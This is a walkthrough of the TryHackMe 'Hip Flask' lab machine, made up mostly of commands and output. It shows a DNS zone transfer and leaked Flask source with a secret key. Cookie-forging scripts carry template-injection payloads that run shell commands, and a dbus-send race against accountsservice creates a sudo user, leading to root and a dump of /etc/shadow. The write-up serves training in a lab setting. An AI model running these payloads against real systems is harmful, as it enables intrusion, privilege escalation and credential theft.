<h1 align="center"><a href="https://tryhackme.com/room/hipflask">Hip Flask</a></h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/b0cddcb5-5fac-455e-9268-bc8b9ffd6ed5"><br>
If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://github.com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20FEV%208-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p>


<br>
<br>


```bash
:~/# nmap MACHINE_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-08 18:22 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for MACHINE_IP
Host is up (0.00046s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
```

```bash
:~/# nmap -vv MACHINE_IP -oN Initial-SYN-Scan
Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-08 18:22 GMT
Initiating Ping Scan at 18:22
Scanning MACHINE_IP [4 ports]
Completed Ping Scan at 18:22, 0.03s elapsed (1 total hosts)
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Initiating SYN Stealth Scan at 18:22
Scanning MACHINE_IP [1000 ports]
Discovered open port 443/tcp on MACHINE_IP
Discovered open port 80/tcp on MACHINE_IP
Discovered open port 53/tcp on MACHINE_IP
Discovered open port 22/tcp on MACHINE_IP
Completed SYN Stealth Scan at 18:22, 0.07s elapsed (1000 total ports)
Nmap scan report for MACHINE_IP
Host is up, received syn-ack ttl 64 (0.00064s latency).
Scanned at 2026-02-08 18:22:59 GMT for 0s
Not shown: 996 closed ports
Reason: 996 resets
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 64
53/tcp  open  domain  syn-ack ttl 64
80/tcp  open  http    syn-ack ttl 64
443/tcp open  https   syn-ack ttl 64

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.060KB)
```
           
```bash
:~/# nmap -p 22,53,80,443 -sV -Pn -vv MACHINE_IP -oN service-scan
Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-08 18:23 GMT
NSE: Loaded 45 scripts for scanning.
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Initiating SYN Stealth Scan at 18:23
Scanning MACHINE_IP [4 ports]
Discovered open port 443/tcp on MACHINE_IP
Discovered open port 53/tcp on MACHINE_IP
Discovered open port 22/tcp on MACHINE_IP
Discovered open port 80/tcp on MACHINE_IP
Completed SYN Stealth Scan at 18:23, 0.03s elapsed (4 total ports)
Initiating Service scan at 18:23
Scanning 4 services on MACHINE_IP
Completed Service scan at 18:23, 16.01s elapsed (4 services on 1 host)
NSE: Script scanning MACHINE_IP.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 18:23
Completed NSE at 18:23, 0.07s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 18:23
Completed NSE at 18:23, 0.01s elapsed
Nmap scan report for MACHINE_IP
Host is up, received user-set (0.00039s latency).
Scanned at 2026-02-08 18:23:21 GMT for 16s

PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
53/tcp  open  domain   syn-ack ttl 64 (unknown banner: Now why would you need this..?)
80/tcp  open  http     syn-ack ttl 64 nginx 1.18.0 (Ubuntu)
443/tcp open  ssl/http syn-ack ttl 64 nginx 1.18.0 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=2/8%Time=6988D4A4%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,4B,"\0I\0\x06\x85\0\0\x01\0\x01\0\0\0\0\x07version\x04b
SF:ind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x1f\x1eNow\x20why\x20wo
SF:uld\x20you\x20need\x20this\.\.\?");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.58 seconds
           Raw packets sent: 4 (176B) | Rcvd: 4 (176B)

```

```bash
:~/# nmap -sU --top-ports 50 -Pn -vv --open  MACHINE_IP -oN udp-top-ports
Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-08 18:24 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Initiating UDP Scan at 18:24
Scanning MACHINE_IP [50 ports]
Increasing send delay for MACHINE_IP from 0 to 50 due to max_successful_tryno increase to 4
Increasing send delay for MACHINE_IP from 50 to 100 due to max_successful_tryno increase to 5
Increasing send delay for MACHINE_IP from 100 to 200 due to max_successful_tryno increase to 6
Increasing send delay for MACHINE_IP from 200 to 400 due to max_successful_tryno increase to 7
Increasing send delay for MACHINE_IP from 400 to 800 due to max_successful_tryno increase to 8
Discovered open port 53/udp on MACHINE_IP
Completed UDP Scan at 18:25, 53.91s elapsed (50 total ports)
Nmap scan report for MACHINE_IP
Host is up, received user-set (0.00087s latency).
Scanned at 2026-02-08 18:24:22 GMT for 54s
Not shown: 46 closed ports
Reason: 46 port-unreaches
PORT     STATE         SERVICE  REASON
53/udp   open          domain   udp-response ttl 64
68/udp   open|filtered dhcpc    no-response
631/udp  open|filtered ipp      no-response
5353/udp open|filtered zeroconf no-response

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 54.03 seconds
           Raw packets sent: 162 (6.039KB) | Rcvd: 49 (3.297KB)

```

<img width="951" height="131" alt="image" src="https://github.com/user-attachments/assets/08ad5a93-89d9-4597-9c59-8e88cac8989e" />

<br>
<br>
<br>

```bash
:~/# dig axfr hipflasks.thm @MACHINE_IP

; <<>> DiG 9.18.28-0ubuntu0.20.04.1-Ubuntu <<>> axfr hipflasks.thm @MACHINE_IP
;; global options: +cmd
hipflasks.thm.		86400	IN	SOA	ns1.hipflasks.thm. localhost. 1 604800 86400 2419200 86400
hipflasks.thm.		86400	IN	NS	ns1.hipflasks.thm.
hipflasks.thm.		86400	IN	NS	localhost.
hipper.hipflasks.thm.	86400	IN	A	MACHINE_IP
www.hipper.hipflasks.thm. 86400	IN	A	MACHINE_IP
ns1.hipflasks.thm.	86400	IN	A	MACHINE_IP
hipflasks.thm.		86400	IN	SOA	ns1.hipflasks.thm. localhost. 1 604800 86400 2419200 86400
;; Query time: 0 msec
;; SERVER: MACHINE_IP#53(MACHINE_IP) (TCP)
;; WHEN: Sun Feb 08 18:36:53 GMT 2026
;; XFR size: 7 records (messages 1, bytes 242)
```

```bash
:~/# host -t axfr hipflasks.thm MACHINE_IP
Trying "hipflasks.thm"
Using domain server:
Name: MACHINE_IP
Address: MACHINE_IP#53
Aliases: 

;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 49499
;; flags: qr aa ra; QUERY: 1, ANSWER: 7, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;hipflasks.thm.			IN	AXFR

;; ANSWER SECTION:
hipflasks.thm.		86400	IN	SOA	ns1.hipflasks.thm. localhost. 1 604800 86400 2419200 86400
hipflasks.thm.		86400	IN	NS	ns1.hipflasks.thm.
hipflasks.thm.		86400	IN	NS	localhost.
hipper.hipflasks.thm.	86400	IN	A	MACHINE_IP
www.hipper.hipflasks.thm. 86400	IN	A	MACHINE_IP
ns1.hipflasks.thm.	86400	IN	A	MACHINE_IP
hipflasks.thm.		86400	IN	SOA	ns1.hipflasks.thm. localhost. 1 604800 86400 2419200 86400

Received 203 bytes from MACHINE_IP#53 in 0 ms
```

```bash
hipper
```


<img width="958" height="768" alt="image" src="https://github.com/user-attachments/assets/532242af-19fd-4cdc-b93b-12e10516bd85" />

<br>
<br>
<br>

<img width="1101" height="803" alt="image" src="https://github.com/user-attachments/assets/b2ec99cd-3284-4398-8bff-555e137463b2" />

<br>
<br>
<br>

<img width="1075" height="256" alt="image" src="https://github.com/user-attachments/assets/1b7b8af2-e51d-4377-8402-173b841daf21" />

<br>
<br>
<br>

<img width="1095" height="698" alt="image" src="https://github.com/user-attachments/assets/130abbe6-259d-441a-a659-799f132dce8a" />

<br>
<br>
<br>

```bash
:~/# nikto -h https://hipper.hipflasks.thm -ssl
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          MACHINE_IP
+ Target Hostname:    hipper.hipflasks.thm
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject: /C=GB/ST=Argyll and Bute/L=Oban/O=Hip Flasks Inc/CN=hipflasks.thm/emailAddress=webmaster@hipflasks.thm
                   Ciphers: TLS_AES_256_GCM_SHA384
                   Issuer:  /C=GB/ST=Argyll and Bute/L=Oban/O=Hip Flasks Inc/CN=hipflasks.thm/emailAddress=webmaster@hipflasks.thm
+ Start Time:         2026-02-08 18:46:33 (GMT0)
---------------------------------------------------------------------------
+ Server: waitress
+ Cookie session created without the secure flag
+ Cookie session created without the httponly flag
+ Uncommon header 'x-frame-options' found, with contents: SAMEORIGIN
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ Uncommon header 'front-end-https' found, with contents: on
+ Uncommon header 'strict-transport-security' found, with contents: max-age=31536000; includeSubDomains
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server banner has changed from 'waitress' to 'nginx/1.18.0 (Ubuntu)' which may suggest a WAF, load balancer or proxy is in place
+ Hostname 'hipper.hipflasks.thm' does not match certificate's CN 'hipflasks.thm/emailAddress=webmaster@hipflasks.thm'
+ Allowed HTTP Methods: GET, OPTIONS, HEAD 
...
```

```bash
:~# curl https://hipper.hipflasks.thm/main.py -k
#!/usr/bin/python3
from flask import Flask, redirect, render_template, request, session
from datetime import datetime
from waitress import serve
from modules import abp
from libs.db import AuthConn, StatsConn

app = Flask(__name__)
app.template_folder="views"
app.config["SECRET_KEY"] = "1a98164eacf96276995566d0c4a4a413"


@app.before_request
def befReq():
	conn = StatsConn()
	if not session.get("visited"):
		conn.addView("uniqueViews")
		session["visited"] = "True"
	conn.addView("totalViews")


@app.route("/")
def home():
	return render_template("index.html", year=datetime.now().date().strftime("%Y")), 200

app.register_blueprint(abp, url_prefix="/admin")


@app.errorhandler(403)
def error403(e):
	return "You are not authorised to access this", 403


#Confirm that there is an admin account in place
AuthConn()

serve(app, host="127.0.0.1", port=8000)
```


```bash
:~# cat __init__.py
from modules.admin import abp
```

```bash
:~# curl https://hipper.hipflasks.thm/modules/admin.py -ks | head
#!/usr/bin/python3
from flask import Blueprint, render_template_string, request, redirect, session, abort, url_for, flash, get_flashed_messages
from libs.auth import authCheck, checkAuth
from libs.db import AuthConn, StatsConn

abp = Blueprint("abp", __name__)

@abp.route("/")
@authCheck
def manageHome():
```

```bash
:~# curl -k https://hipper.hipflasks.thm/libs/auth.py
from flask import session, redirect, url_for, flash
from functools import wraps

checkAuth = lambda: session.get("auth") == "True"

def authCheck(func):
    @wraps(func)
    def innerCheck(*args, **kwargs):
        if checkAuth():
            return func(*args, **kwargs)
        else:
            flash("Please login before accessing the admin area")
            return redirect(url_for("abp.loginRoute")), 301
    return innerCheck



:~# curl -k https://hipper.hipflasks.thm/libs/db/__init__.py
from libs.db.base import Conn
from libs.db.auth import AuthConn
from libs.db.stats import StatsConn
```

```bash
:~/lesson# curl -k https://hipper.hipflasks.thm/data/users.db -o users.db
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 12288  100 12288    0     0   307k      0 --:--:-- --:--:-- --:--:--  315k
```

```bash
:~/lesson# ls -lah
total 20K
drwxr-xr-x  2 root root 4.0K Feb  8 19:13 .
drwxr-xr-x 53 root root 4.0K Feb  8 19:13 ..
-rw-r--r--  1 root root  12K Feb  8 19:13 users.db
```

```bash
:~/lesson# curl -k https://hipper.hipflasks.thm/data/stats.db -o stats.db
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 12288  100 12288    0     0   631k      0 --:--:-- --:--:-- --:--:--  631k
```

```bash
:~/lesson# ls -lah
total 32K
drwxr-xr-x  2 root root 4.0K Feb  8 19:14 .
drwxr-xr-x 53 root root 4.0K Feb  8 19:13 ..
-rw-r--r--  1 root root  12K Feb  8 19:14 stats.db
-rw-r--r--  1 root root  12K Feb  8 19:13 users.db
```

```bash
:~/lesson# ls -lah
total 52K
drwxr-xr-x  2 root root 4.0K Feb  8 19:18 .
drwxr-xr-x 53 root root 4.0K Feb  8 19:13 ..
-rw-r--r--  1 root root 4.8K Feb  8 19:17 admin.py
-rw-r--r--  1 root root  435 Feb  8 19:18 auth.py
-rw-r--r--  1 root root  100 Feb  8 19:16 __init__.py
-rw-r--r--  1 root root  862 Feb  8 19:18 main.py
-rw-r--r--  1 root root  12K Feb  8 19:14 stats.db
-rw-r--r--  1 root root  12K Feb  8 19:13 users.db
```

```bash
:~/lesson# python3 -m venv poc-venv
```

```bash
:~/lesson# source poc-venv/bin/activate
(poc-venv) r...:~/lesson# 
```

```bash
(poc-venv) r...:~/lesson# pip3 install flask requests waitress
```

<img width="944" height="603" alt="image" src="https://github.com/user-attachments/assets/dc136aef-4b41-4f02-8135-4aeb8cadeec7" />

<br>
<br>
<br>

<img width="1082" height="513" alt="image" src="https://github.com/user-attachments/assets/d24437e7-a153-4638-a2a2-bd04c88cfa1d" />

<br>
<br>
<br>

```bash
#!/usr/bin/env python3
from flask import Flask, session, request
from waitress import serve
import requests, threading, time

app = Flask(__name__)
app.config["SECRET_KEY"] = "1a98164eacf96276995566d0c4a4a413"

@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = "Pentester"
    return "Check your cookies", 200

thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()

time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))
```

```bash
(poc-venv) ...:~/lesson/poc-venv# ./bin/python3 a.py
eyJhdXRoIjoiVHJ1ZSIsInVzZXJuYW1lIjoiUGVudGVzdGVyIn0.aYjo7Q.hOtEDEOxh2VGxQ-tO2lkiEibi3A
```

<img width="1087" height="541" alt="image" src="https://github.com/user-attachments/assets/84dd8e51-23c7-4b60-88e4-bbc51264ceb7" />

<br>
<br>
<br>

```bash
#!/usr/bin/env python3
from flask import Flask, session, request
from waitress import serve
import requests, threading, time

app = Flask(__name__)
app.config["SECRET_KEY"] = "1a98164eacf96276995566d0c4a4a413"

@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = "{{9*9}}"
    return "Check your cookies", 200

thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()

time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))
```

```bash
:~/lesson/poc-venv# ./bin/python3 a.py
eyJhdXRoIjoiVHJ1ZSIsInVzZXJuYW1lIjoie3s5Kjl9fSJ9.aYjqFg.X-v_pQ3cG8OkrnpcsW8FJy4keQ4
```

<img width="1093" height="469" alt="image" src="https://github.com/user-attachments/assets/13b06771-03ff-4d3d-b449-60dd949f336e" />

<br>
<br>
<br>

```bash
#!/usr/bin/env python3
from flask import Flask, session, request
from waitress import serve
import requests, threading, time

app = Flask(__name__)
app.config["SECRET_KEY"] = "1a98164eacf96276995566d0c4a4a413"

@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = """{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}"""
    return "Check your cookies", 200

thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()

time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))
```

```bash
:~/lesson/poc-venv# ./bin/python3 a.py
.eJwdyEEKgCAQAMC_7EWF8AG9o1uEbLaZYCqunsS_J92G6YCtPrDCVhrBAo2pRHxpTu82xds7bYwNyGzMlI--_nAhnRhm7iKxOHROmaIUgYXShfCSagwYH0KTIT4.aYjqlg.9h0c2WvII4utL3FCdmWG1tanMXc
```

<img width="1094" height="604" alt="image" src="https://github.com/user-attachments/assets/863990e3-0fb5-4aef-8f64-55afed131353" />

<br>
<br>
<br>

```bash
#!/usr/bin/env python3
from flask import Flask, session, request
from waitress import serve
import requests, threading, time

app = Flask(__name__)
app.config["SECRET_KEY"] = "1a98164eacf96276995566d0c4a4a413"

@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = """{{config.__class__.__init__.__globals__['os'].popen('echo ""; id; whoami; echo ""; which nc bash curl wget; echo ""; sestatus 2>&1; aa-status 2>&1; echo ""; cat /etc/*-release; echo""; cat /etc/iptables/*').read()}}"""
    return "Check your cookies", 200

thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()

time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))
```

```bash
~/lesson/poc-venv# ./bin/python3 a.py
.eJxdissOgjAQRX9l0oU8IhBdSuJXuBNDhjLSJqUlnTYsCP8u0Q24O_ecuwiMQYmbePhI4iwik7c40maWRTr71kPZttIgc9tupK0OXxiM69Bs8pk4Tl7l5CayaUJSOWhEI2rQfQ2zcjjqGnZ6VloqsBI6ZAUyegPzQOHwYeKAITJc76dLDYjFYe-eEgNUFGSVF54MIdMv_1U9BewMcZUnWekJ-zRbV7F-AHqJUzY.aYjrPA.wl922E57Afh54bR47YoWbDgvYIs
```

<img width="1089" height="712" alt="image" src="https://github.com/user-attachments/assets/89f65e1f-c57f-49a9-aead-ab078a504bc7" />

<br>
<br>
<br>

```bash
Admin Console Welcome, uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data /usr/bin/nc /usr/bin/bash /usr/bin/curl /usr/bin/wget /bin/sh: 1: sestatus: not found You do not have enough privilege to read the profile set. apparmor module is loaded. DISTRIB_ID=Ubuntu DISTRIB_RELEASE=20.04 DISTRIB_CODENAME=focal DISTRIB_DESCRIPTION="Ubuntu 20.04.2 LTS" NAME="Ubuntu" VERSION="20.04.2 LTS (Focal Fossa)" ID=ubuntu ID_LIKE=debian PRETTY_NAME="Ubuntu 20.04.2 LTS" VERSION_ID="20.04" HOME_URL="https://www.ubuntu.com/" SUPPORT_URL="https://help.ubuntu.com/" BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/" PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy" VERSION_CODENAME=focal UBUNTU_CODENAME=focal # Generated by iptables-save v1.8.4 on Tue Jun 22 22:27:55 2021 *filter :INPUT ACCEPT [174:25634] :FORWARD ACCEPT [0:0] :OUTPUT DROP [0:0] -A INPUT -p icmp -j DROP -A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT -A OUTPUT -o lo -j ACCEPT -A OUTPUT -p tcp -m multiport --dports 443,445,80,25,53 -j ACCEPT -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT -A OUTPUT -p icmp -j ACCEPT COMMIT # Completed on Tue Jun 22 22:27:55 2021 # Generated by ip6tables-save v1.8.4 on Tue Jun 22 22:27:55 2021 *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [0:0] COMMIT # Completed on Tue Jun 22 22:27:55 2021

There have been 7459 unique visitors to the site!
```

```bash
Admin Console Welcome,

uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data

/usr/bin/nc
/usr/bin/bash
/usr/bin/curl
/usr/bin/wget

/bin/sh: 1: sestatus: not found
You do not have enough privilege to read the profile set.
apparmor module is loaded.

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal DISTRIB_DESCRIPTION="Ubuntu 20.04.2 LTS" NAME="Ubuntu" VERSION="20.04.2 LTS (Focal Fossa)" ID=ubuntu ID_LIKE=debian PRETTY_NAME="Ubuntu 20.04.2 LTS" VERSION_ID="20.04" HOME_URL="https://www.ubuntu.com/" SUPPORT_URL="https://help.ubuntu.com/" BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/" PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy" VERSION_CODENAME=focal UBUNTU_CODENAME=focal # Generated by iptables-save v1.8.4 on Tue Jun 22 22:27:55 2021 *filter :INPUT ACCEPT [174:25634] :FORWARD ACCEPT [0:0] :OUTPUT DROP [0:0] -A INPUT -p icmp -j DROP -A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT -A OUTPUT -o lo -j ACCEPT -A OUTPUT -p tcp -m multiport --dports 443,445,80,25,53 -j ACCEPT -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT -A OUTPUT -p icmp -j ACCEPT COMMIT # Completed on Tue Jun 22 22:27:55 2021 # Generated by ip6tables-save v1.8.4 on Tue Jun 22 22:27:55 2021 *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [0:0] COMMIT # Completed on Tue Jun 22 22:27:55 2021

There have been 7459 unique visitors to the site!
```

```bash
:~/lesson/poc-venv# ./bin/python3 a.py
.eJxNzE8LgjAcxvG38mOHphD7YzuEhu8h8FIRY9rUkdtk05P53pMuefvy4eFZkJqnHuWoCrNGRzRHHZyyepNlabxrTUekbAYVo5RbGWemX3SDr9Ww4QP7iJ9k9KN2Cbbv1rQe6GRHeq-u7FaAa4AzcmaEZ4JwwUGIE7DLfwIfoLVxNPZQ7jQrD7yAYHdnOCVBq1eSritav6RYOrc.aYjsWw.cIp05caJD5DZEYBpSvBvUG9FJAE
```

<img width="941" height="347" alt="image" src="https://github.com/user-attachments/assets/4d823647-f0c0-44fe-bbe4-cc2d6da84f8b" />

<br>
<br>
<br>

<img width="938" height="538" alt="image" src="https://github.com/user-attachments/assets/fe181d4c-1798-48ee-9c66-4154a85a0abd" />


```bash
www-data@websrv1:/opt/site$ cat /etc/passwd | grep -i /bin/bash
root:x:0:0:root:/root:/bin/bash
www-data@websrv1:/opt/site$ 
```

```bash
www-data@websrv1:/opt/site$ time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required

real	0m0.011s
user	0m0.001s
sys	0m0.000s
```

```bash
www-data@websrv1:/opt/site$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
[1] 1183
```

```bash
www-data@websrv1:/opt/site$ id attacker
uid=1000(attacker) gid=1000(attacker) groups=1000(attacker),27(sudo)
[1]+  Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
www-data@websrv1:/opt/site$ 
```

```bash
www-data@websrv1:/opt/site$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
[1] 1224
```

```bash
www-data@websrv1:/opt/site$ su attacker
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

attacker@websrv1:/opt/site$ 
```

<img width="943" height="438" alt="image" src="https://github.com/user-attachments/assets/ad8379b9-6fd6-4561-9aff-4b3d319229ca" />

<br>
<br>
<br>

```bash
attacker@websrv1:/opt/site$ sudo -s
[sudo] password for attacker: 
root@websrv1:/opt/site# 
```

```bash
root@websrv1:/opt/site# whoami
root
```

```bash
root@websrv1:/opt/site# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@websrv1:/opt/site# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 0a:3c:4d:cd:9f:41 brd ff:ff:ff:ff:ff:ff
    inet MACHINE_IP/18 brd 10.80.191.255 scope global dynamic eth0
       valid_lft 1060sec preferred_lft 1060sec
    inet6 fe80::83c:4dff:fecd:9f41/64 scope link 
       valid_lft forever preferred_lft forever
```


<img width="949" height="333" alt="image" src="https://github.com/user-attachments/assets/5ea18733-8abd-4237-9c00-fb1cefc8e19f" />

<br>
<br>
<br>

```bash
root@websrv1:~# cat /etc/shadow | grep root
root:$6$./Fh3mWMsk8X29kq$6CvaDzV7zlXKn1MMQjXtO.abB4/7ecNKBFkQvEWsLkgM8raAZeuSHZurnXG01pqZ4BY2ubk/WgIbo4ee.wnaP0:18791:0:99999:7:::
```

<img width="943" height="129" alt="image" src="https://github.com/user-attachments/assets/666a2851-8397-4f25-9a08-fa76c9c99335" />

<br>
<br>
<br>

<h1>Completed</h1>

<img width="1890" height="895" alt="image" src="https://github.com/user-attachments/assets/f6ce9325-b512-46b9-a9ef-fe0e746f5414" />


<br>
<br>

<p align="center">Global All Time:    47ᵗʰ<br><img width="300px" src="https://github.com/user-attachments/assets/e8e62d77-d998-46da-b482-91292e1d4078"><br>
                                              <img width="300px" src="https://github.com/user-attachments/assets/035cced9-cadf-48c5-adeb-8fe41a6acaed"><br>
	                                          <img width="1200px" src="https://github.com/user-attachments/assets/13671e29-0c67-4e03-a14b-fe02e2c911a1"><br><br>
                  Brazil All Time:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/df75d9c2-0a8a-41d5-88fe-5d39a7effb56"><br><br>
                  Global monthly:      62ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/0b5ff86c-82d3-435d-b972-634e3f8ee7d1"><br><br>
                  Brazil monthly:       3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/179853c0-e799-45cb-84f1-44f4fcc7523a"></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
